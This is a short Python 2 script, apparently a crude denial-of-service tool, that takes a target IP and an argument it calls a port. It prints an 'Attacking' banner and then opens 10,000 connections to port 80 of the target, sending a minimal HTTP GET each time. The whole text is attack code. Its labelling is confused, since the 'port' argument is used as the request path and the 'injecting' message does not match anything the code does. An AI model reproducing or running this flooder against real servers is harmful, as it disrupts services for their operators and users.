import socket, os, sys

ip = sys.argv[1]
port = sys.argv[2]

print "][ Attacking " + ip + " ... ]["
print "injecting " + port;
def attack(): 
  #pid = os.fork()
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((sys.argv[1], 80))
  print ">> GET /" + port + " HTTP/1.1"
  s.send("GET /" + port + " HTTP/1.1\r\n")
  s.send("Host: " + ip + "\r\n\r\n");
  s.close()
  
for i in range(1, 10000):
  attack() 